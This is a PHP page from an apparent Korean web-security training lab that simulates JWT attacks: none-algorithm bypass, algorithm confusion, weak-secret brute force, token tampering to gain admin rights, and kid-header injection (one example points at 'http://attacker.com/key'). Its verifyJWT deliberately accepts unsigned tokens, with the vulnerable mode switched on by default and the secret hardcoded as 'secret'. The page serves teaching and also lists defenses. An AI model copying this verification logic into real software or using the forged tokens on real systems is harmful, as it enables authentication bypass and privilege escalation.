<?php
// 출력 버퍼링 시작 (헤더 전송 문제 방지)
ob_start();

// 세션 시작 (TestPage 전에)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . "/../db.php";
require_once __DIR__ . "/../utils.php";

// 로그인 확인
if (!is_logged_in()) {
    header("Location: ../login.php");
    exit();
}

require_once 'TestPage.php';

// JWT 헬퍼 함수들 (이 파일 내에서만 사용되므로 여기에 유지)
function base64UrlEncode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64UrlDecode($data) {
    return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
}

function createJWT($header, $payload, $secret = 'secret') {
    $headerEncoded = base64UrlEncode(json_encode($header));
    $payloadEncoded = base64UrlEncode(json_encode($payload));
    
    $signature = hash_hmac('sha256', $headerEncoded . '.' . $payloadEncoded, $secret, true);
    $signatureEncoded = base64UrlEncode($signature);
    
    return $headerEncoded . '.' . $payloadEncoded . '.' . $signatureEncoded;
}

function parseJWT($jwt) {
    $parts = explode('.', $jwt);
    if (count($parts) !== 3) {
        return false;
    }
    
    return [
        'header' => json_decode(base64UrlDecode($parts[0]), true),
        'payload' => json_decode(base64UrlDecode($parts[1]), true),
        'signature' => $parts[2]
    ];
}

function verifyJWT($jwt, $secret = 'secret') {
    $parts = explode('.', $jwt);
    if (count($parts) !== 3) {
        return false;
    }
    
    $header = json_decode(base64UrlDecode($parts[0]), true);
    $payload = json_decode(base64UrlDecode($parts[1]), true);
    
    // VULNERABILITY_MODE가 정의되어 있고 true인 경우에만 취약점 시뮬레이션
    if (defined('VULNERABILITY_MODE') && VULNERABILITY_MODE === true) {
        // None 알고리즘 취약점 - 서명 검증 우회
        if (isset($header['alg']) && $header['alg'] === 'none') {
            return $payload;
        }
        
        // 알고리즘 혼동 공격 - HS256을 RS256으로 혼동
        if (isset($header['alg']) && $header['alg'] === 'RS256') {
            // 실제로는 HS256으로 검증 (키 혼동)
            $expectedSignature = base64UrlEncode(hash_hmac('sha256', $parts[0] . '.' . $parts[1], $secret, true));
            if (hash_equals($expectedSignature, $parts[2])) {
                return $payload;
            }
        }
    }
    
    // 정상적인 HMAC 검증
    $expectedSignature = base64UrlEncode(hash_hmac('sha256', $parts[0] . '.' . $parts[1], $secret, true));
    if (hash_equals($expectedSignature, $parts[2])) {
        return $payload;
    }
    
    return false;
}

// VULNERABILITY_MODE 정의 (테스트를 위해 임시로 정의)
if (!defined('VULNERABILITY_MODE')) {
    define('VULNERABILITY_MODE', true);
}

// 1. 페이지 설정
$page_title = 'JWT (JSON Web Token)';
$description = '<p><strong>JWT (JSON Web Token)</strong>는 정보를 안전하게 전송하기 위한 간결하고 자체 포함된 방법입니다.</p>
<p>하지만 잘못 구현될 경우 다양한 취약점에 노출될 수 있습니다. 이 페이지에서는 JWT의 주요 취약점을 시뮬레이션합니다.</p>';

// 2. 페이로드 정의 (공격 시나리오 설명)
$payloads = [
    'none_algorithm' => [
        'title' => '🚫 None Algorithm Attack',
        'description' => 'JWT의 알고리즘을 "none"으로 설정하여 서명 검증을 우회합니다.',
        'payloads' => [
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'
        ]
    ],
    'algorithm_confusion' => [
        'title' => '🔄 Algorithm Confusion Attack',
        'description' => 'RSA 공개키를 HMAC 시크릿으로 사용하여 토큰을 위조합니다.',
        'payloads' => [
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature_using_public_key_as_secret'
        ]
    ],
    'weak_secret' => [
        'title' => '🔑 Weak Secret Brute Force',
        'description' => '사전 공격으로 약한 JWT 시크릿 키를 찾아냅니다.',
        'payloads' => [
            'secret', '123456', 'password', 'key', 'jwt'
        ]
    ],
    'token_manipulation' => [
        'title' => '📝 Token Manipulation',
        'description' => 'JWT 페이로드를 조작하여 권한을 상승시키거나 만료 시간을 연장합니다.',
        'payloads' => [
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdHVzZXIiLCJyb2xlIjoidXNlciIsImV4cCI6MTY3ODg4NjQwMH0.signature'
        ]
    ],
    'jwt_parsing' => [
        'title' => '🔍 JWT Information Disclosure',
        'description' => 'JWT 토큰을 파싱하여 민감한 정보를 추출합니다.',
        'payloads' => [
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdHVzZXIiLCJyb2xlIjoidXNlciIsImV4cCI6MTY3ODg4NjQwMH0.signature'
        ]
    ]
];

// 3. 방어 방법 정의
$defense_methods = [
    "<strong>강력한 시크릿 키 사용:</strong> 최소 256비트 이상의 강력하고 예측 불가능한 시크릿 키를 사용합니다.",
    "<strong>알고리즘 엄격 검증:</strong> 토큰 헤더의 `alg` 필드를 서버에서 허용하는 알고리즘 목록과 비교하여 엄격하게 검증합니다.",
    "<strong>토큰 만료 시간 관리:</strong> `exp` 클레임을 사용하여 토큰의 유효 기간을 짧게 설정하고, 만료된 토큰은 즉시 무효화합니다.",
    "<strong>민감 정보 포함 금지:</strong> JWT 페이로드에 비밀번호, 개인 식별 정보 등 민감한 데이터를 포함하지 않습니다.",
    "<strong>토큰 암호화 (JWE):</strong> 필요시 JWT를 암호화하여 전송합니다.",
    "<strong>블랙리스트/화이트리스트:</strong> 탈취되거나 만료된 토큰을 블랙리스트에 추가하거나, 유효한 토큰만 화이트리스트에 등록하여 관리합니다."
];

// 4. 참고 자료 정의
$references = [
    "OWASP - JWT Attacks" => "https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_JWT_Tokens.pdf",
    "JWT.io Debugger" => "https://jwt.io/",
    "PayloadsAllTheThings - JWT" => "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token"
];

// 5. 테스트 폼 UI 정의
$default_header = ['typ' => 'JWT', 'alg' => 'HS256'];
$default_payload = ['user' => 'testuser', 'role' => 'user', 'exp' => time() + 3600];
$default_jwt = createJWT($default_header, $default_payload);

$jwt_token_input = htmlspecialchars($_POST['payload'] ?? $default_jwt);
$attack_type_selected = htmlspecialchars($_POST['attack_type'] ?? '');

$test_form_ui = <<<HTML
<div class="info-box" style="background: #d4edda; border-color: #c3e6cb; color: #155724;">
    <h5><i class="bi bi-card-text"></i> 테스트용 JWT 토큰</h5>
    <div class="jwt-token" style="word-break: break-all; font-family: monospace; background-color: #e9ecef; padding: 10px; border-radius: 5px;">
        {$default_jwt}
    </div>
    <small class="text-muted">Header: {"typ":"JWT","alg":"HS256"} | Payload: {"user":"testuser","role":"user","exp":<span id="exp_time"></span>}</small>
</div>

<form method="post" class="test-form">
    <h3>🧪 JWT 공격 시뮬레이션</h3>
    <label for="attack_type">공격 유형</label>
    <select name="attack_type" id="attack_type" class="form-select" required>
        <option value="">선택하세요</option>
        <option value="none_algorithm" {$attack_type_selected === 'none_algorithm' ? 'selected' : ''}>None Algorithm Attack</option>
        <option value="algorithm_confusion" {$attack_type_selected === 'algorithm_confusion' ? 'selected' : ''}>Algorithm Confusion</option>
        <option value="weak_secret" {$attack_type_selected === 'weak_secret' ? 'selected' : ''}>Weak Secret Brute Force</option>
        <option value="token_manipulation" {$attack_type_selected === 'token_manipulation' ? 'selected' : ''}>Token Manipulation</option>
        <option value="jwt_parsing" {$attack_type_selected === 'jwt_parsing' ? 'selected' : ''}>JWT Information Disclosure</option>
    </select>
    <br>
    <label for="payload">JWT 토큰</label>
    <input type="text" name="payload" id="payload" class="form-control" value="{$jwt_token_input}" required>
    <br>
    <button type="submit" class="btn btn-danger w-100">
        <i class="bi bi-bug"></i> 공격 시뮬레이션
    </button>
</form>

<script>
    // 만료 시간 업데이트
    document.getElementById('exp_time').textContent = Math.floor(Date.now() / 1000) + 3600;

    // JWT 토큰 자동 복사 기능
    document.querySelectorAll('.jwt-token').forEach(function(element) {
        element.style.cursor = 'pointer';
        element.title = '클릭하여 복사';
        element.addEventListener('click', function() {
            navigator.clipboard.writeText(this.textContent.trim()).then(function() {
                const originalBg = element.style.backgroundColor;
                element.style.backgroundColor = '#28a745';
                setTimeout(() => {
                    element.style.backgroundColor = originalBg;
                }, 1000);
            });
        });
    });
</script>
HTML;

// 6. 테스트 로직 콜백 정의
$test_logic_callback = function($form_data) use ($default_jwt) {
    $jwt_token = $form_data['payload'] ?? $default_jwt;
    $test_type = $form_data['attack_type'] ?? '';
    $result_html = '';
    $error = '';

    if (empty($test_type)) {
        $error = "공격 유형을 선택해주세요.";
        return ['result' => '', 'error' => $error];
    }

    switch ($test_type) {
        case 'none_algorithm':
            $header = ['typ' => 'JWT', 'alg' => 'none'];
            $payload = ['user' => 'admin', 'role' => 'administrator', 'exp' => time() + 3600];
            $malicious_jwt = base64UrlEncode(json_encode($header)) . '.' . base64UrlEncode(json_encode($payload)) . '.';
            $verification_result = verifyJWT($malicious_jwt);
            
            $result_html .= "<p><strong>공격 유형:</strong> None Algorithm Attack</p>";
            $result_html .= "<p><strong>설명:</strong> JWT의 알고리즘을 \"none\"으로 설정하여 서명 검증을 우회합니다.</p>";
            $result_html .= "<p><strong>조작된 토큰:</strong> <code style=\"word-break: break-all;\">" . htmlspecialchars($malicious_jwt) . "</code></p>";
            if ($verification_result !== false) {
                $result_html .= "<p style=\"color: red; font-weight: bold;\">✅ 공격 성공: 토큰이 검증되었습니다! (취약점 모드)</p>";
                $result_html .= "<pre>" . htmlspecialchars(json_encode($verification_result, JSON_PRETTY_PRINT)) . "</pre>";
            } else {
                $result_html .= "<p style=\"color: green; font-weight: bold;\">❌ 공격 실패: 토큰이 거부되었습니다. (안전)</p>";
            }
            break;
            
        case 'algorithm_confusion':
            $header = ['typ' => 'JWT', 'alg' => 'RS256'];
            $payload = ['user' => 'admin', 'role' => 'administrator', 'exp' => time() + 3600];
            $public_key = 'secret'; // 실제로는 RSA 공개키를 사용
            $malicious_jwt = createJWT($header, $payload, $public_key);
            $verification_result = verifyJWT($malicious_jwt);

            $result_html .= "<p><strong>공격 유형:</strong> Algorithm Confusion Attack</p>";
            $result_html .= "<p><strong>설명:</strong> RSA 공개키를 HMAC 시크릿으로 사용하여 토큰을 위조합니다.</p>";
            $result_html .= "<p><strong>조작된 토큰:</strong> <code style=\"word-break: break-all;\">" . htmlspecialchars($malicious_jwt) . "</code></p>";
            if ($verification_result !== false) {
                $result_html .= "<p style=\"color: red; font-weight: bold;\">✅ 공격 성공: 토큰이 검증되었습니다! (취약점 모드)</p>";
                $result_html .= "<pre>" . htmlspecialchars(json_encode($verification_result, JSON_PRETTY_PRINT)) . "</pre>";
            } else {
                $result_html .= "<p style=\"color: green; font-weight: bold;\">❌ 공격 실패: 토큰이 거부되었습니다. (안전)</p>";
            }
            break;
            
        case 'weak_secret':
            $weak_secrets = ['secret', '123456', 'password', 'key', 'jwt', 'test'];
            $cracked_payload = null;
            $used_secret = null;
            
            foreach ($weak_secrets as $weak_secret) {
                $result = verifyJWT($jwt_token, $weak_secret);
                if ($result !== false) {
                    $cracked_payload = $result;
                    $used_secret = $weak_secret;
                    break;
                }
            }
            
            $result_html .= "<p><strong>공격 유형:</strong> Weak Secret Brute Force</p>";
            $result_html .= "<p><strong>설명:</strong> 사전 공격으로 약한 JWT 시크릿 키를 찾아냅니다.</p>";
            if ($cracked_payload !== null) {
                $result_html .= "<p style=\"color: red; font-weight: bold;\">✅ 공격 성공: 약한 시크릿 키 발견 - " . htmlspecialchars($used_secret) . "</p>";
                $result_html .= "<p><strong>해독된 페이로드:</strong></p><pre>" . htmlspecialchars(json_encode($cracked_payload, JSON_PRETTY_PRINT)) . "</pre>";
            } else {
                $result_html .= "<p style=\"color: green; font-weight: bold;\">❌ 공격 실패: 약한 시크릿 키를 찾지 못했습니다.</p>";
            }
            break;
            
        case 'token_manipulation':
            $parsed = parseJWT($jwt_token);
            if ($parsed) {
                $malicious_payload = $parsed['payload'];
                $malicious_payload['user'] = 'admin';
                $malicious_payload['role'] = 'administrator';
                $malicious_payload['exp'] = time() + 86400; // 24시간 연장
                
                $malicious_jwt = createJWT($parsed['header'], $malicious_payload);
                $verification_result = verifyJWT($malicious_jwt);
                
                $result_html .= "<p><strong>공격 유형:</strong> Token Manipulation</p>";
                $result_html .= "<p><strong>설명:</strong> JWT 페이로드를 조작하여 권한을 상승시키거나 만료 시간을 연장합니다.</p>";
                $result_html .= "<p><strong>조작된 토큰:</strong> <code style=\"word-break: break-all;\">" . htmlspecialchars($malicious_jwt) . "</code></p>";
                if ($verification_result !== false) {
                    $result_html .= "<p style=\"color: red; font-weight: bold;\">✅ 공격 성공: 조작된 토큰이 검증되었습니다! (취약점 모드)</p>";
                    $result_html .= "<pre>" . htmlspecialchars(json_encode($verification_result, JSON_PRETTY_PRINT)) . "</pre>";
                } else {
                    $result_html .= "<p style=\"color: green; font-weight: bold;\">❌ 공격 실패: 조작된 토큰이 거부되었습니다. (안전)</p>";
                }
            } else {
                $error = "유효한 JWT 토큰이 아닙니다.";
            }
            break;
            
        case 'jwt_parsing':
            $parsed = parseJWT($jwt_token);
            
            $result_html .= "<p><strong>공격 유형:</strong> JWT Information Disclosure</p>";
            $result_html .= "<p><strong>설명:</strong> JWT 토큰을 파싱하여 민감한 정보를 추출합니다.</p>";
            if ($parsed) {
                $result_html .= "<p style=\"color: green; font-weight: bold;\">✅ 파싱 성공:</p>";
                $result_html .= "<p><strong>Header:</strong><pre>" . htmlspecialchars(json_encode($parsed['header'], JSON_PRETTY_PRINT)) . "</pre></p>";
                $result_html .= "<p><strong>Payload:</strong><pre>" . htmlspecialchars(json_encode($parsed['payload'], JSON_PRETTY_PRINT)) . "</pre></p>";
                $result_html .= "<p><strong>Signature:</strong><pre>" . htmlspecialchars($parsed['signature']) . "</pre></p>";
            } else {
                $result_html .= "<p style=\"color: red; font-weight: bold;\">❌ 파싱 실패: 유효한 JWT 토큰이 아닙니다.</p>";
            }
            break;
    }

    return ['result' => $result_html, 'error' => $error];
};

// 7. TestPage 인스턴스 생성 및 실행
$test_page = new TestPage($page_title, $description, $payloads, $defense_methods, $references);
$test_page->set_test_form($test_form_ui);
$test_page->set_test_logic($test_logic_callback);
$test_page->run();

?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT 취약점 테스트 - PayloadsAllTheThings</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.css">
    <style>
        .vulnerability-warning {
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            color: white;
            animation: pulse 2s infinite;
        }
        
        .payload-box {
            background-color: #f8f9fa;
            border-left: 4px solid #007bff;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        }
        
        .result-success {
            background-color: #d4edda;
            border-color: #c3e6cb;
            color: #155724;
        }
        
        .result-info {
            background-color: #cce7ff;
            border-color: #99d6ff;
            color: #004085;
        }
        
        .jwt-token {
            word-break: break-all;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 0.85em;
            background-color: #2d3748;
            color: #e2e8f0;
            padding: 1rem;
            border-radius: 0.5rem;
        }
        
        .cvss-critical { color: #dc3545; font-weight: bold; }
        .cvss-high { color: #fd7e14; font-weight: bold; }
        .cvss-medium { color: #ffc107; font-weight: bold; }
        .cvss-low { color: #198754; font-weight: bold; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-shield-exclamation"></i> WebHacking Test
            </a>
            <a href="index.php" class="btn btn-outline-light btn-sm">
                <i class="bi bi-arrow-left"></i> 메인으로
            </a>
        </div>
    </nav>

    <?php if (defined('VULNERABILITY_MODE') && VULNERABILITY_MODE === true): ?>
        <div class="alert vulnerability-warning alert-dismissible fade show m-0 rounded-0" role="alert">
            <div class="container">
                <i class="bi bi-exclamation-triangle-fill me-2"></i>
                <strong>취약점 모드 활성화</strong> - JWT 공격이 시뮬레이션됩니다 (교육 목적)
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="alert"></button>
            </div>
        </div>
    <?php endif; ?>

    <div class="container mt-4">
        <div class="row">
            <div class="col-12">
                <div class="card shadow-sm">
                    <div class="card-header bg-primary text-white">
                        <h2 class="card-title mb-0">
                            <i class="bi bi-key"></i> JWT (JSON Web Token) 취약점 테스트
                        </h2>
                    </div>
                    <div class="card-body">
                        <div class="alert alert-info">
                            <i class="bi bi-info-circle"></i>
                            <strong>JWT 보안 테스트</strong><br>
                            JWT 토큰의 다양한 취약점을 테스트합니다. PayloadsAllTheThings 기반의 실제 공격 시나리오를 시뮬레이션합니다.
                        </div>

                        <!-- 테스트 폼 -->
                        <?php echo $test_form_ui; ?>

                        <!-- 테스트 결과 -->
                        <?php if (!empty($result_html)): ?>
                            <div class="card mb-4 mt-4">
                                <div class="card-header">
                                    <h5 class="mb-0">
                                        <i class="bi bi-bug-fill"></i> 
                                        <?php echo htmlspecialchars($educational_info[$test_type]['attack_type'] ?? ''); ?>
                                        <?php if ($result['success']): ?> <!-- This part needs to be re-evaluated based on actual test logic -->
                                            <span class="badge bg-danger ms-2">공격 성공</span>
                                        <?php else: ?>
                                            <span class="badge bg-success ms-2">방어됨</span>
                                        <?php endif; ?> 
                                    </h5>
                                </div>
                                <div class="card-body">
                                    <?php echo $result_html; ?>
                                </div>
                            </div>
                        <?php elseif (!empty($error)): ?>
                            <div class="alert alert-danger mt-4"><strong>오류:</strong> <?php echo htmlspecialchars($error); ?></div>
                        <?php endif; ?>

                        <!-- PayloadsAllTheThings 참고 자료 -->
                        <div class="card mt-4">
                            <div class="card-header">
                                <h5 class="mb-0"><i class="bi bi-book"></i> PayloadsAllTheThings JWT 공격 페이로드</h5>
                            </div>
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6>None Algorithm Attack</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</code>
                                        </div>
                                        
                                        <h6>Algorithm Confusion (RS256 → HS256)</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code># 공개키를 HMAC 시크릿으로 사용<br>
                                            jwt.encode(payload, public_key, algorithm='HS256')</code>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h6>Weak Secret Dictionary</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code>secret, 123456, password, key, jwt<br>
                                            admin, test, qwerty, letmein<br>
                                            hello, world, default, token</code>
                                        </div>
                                        
                                        <h6>JWT Kid Injection</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code>"kid": "/path/to/file"<br>
                                            "kid": "../../public.key"<br>
                                            "kid": "http://attacker.com/key"</code>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="alert alert-warning mt-3">
                                    <i class="bi bi-exclamation-triangle"></i>
                                    <strong>참고 자료:</strong>
                                    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" target="_blank" class="alert-link">
                                        PayloadsAllTheThings - JWT
                                    </a> |
                                    <a href="https://jwt.io/" target="_blank" class="alert-link">JWT.io Debugger</a> |
                                    <a href="https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_JWT_Tokens.pdf" target="_blank" class="alert-link">OWASP JWT Attacks</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    
</body>
</html>
